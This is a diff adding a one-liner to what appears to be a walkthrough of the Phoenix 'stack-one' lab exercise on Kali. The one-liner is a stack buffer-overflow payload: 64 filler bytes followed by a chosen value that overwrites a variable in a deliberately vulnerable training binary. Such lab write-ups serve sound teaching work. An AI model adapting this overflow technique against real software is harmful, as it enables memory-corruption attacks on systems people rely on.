@@ -46,3 +46,10 @@ Well done, you have successfully set changeme to the correct value
 ┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
 └─$ 
 ```
+
+
+This is our One Liner
+
+```
+./stack-one $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x62\x59\x6c\x49')")
+```
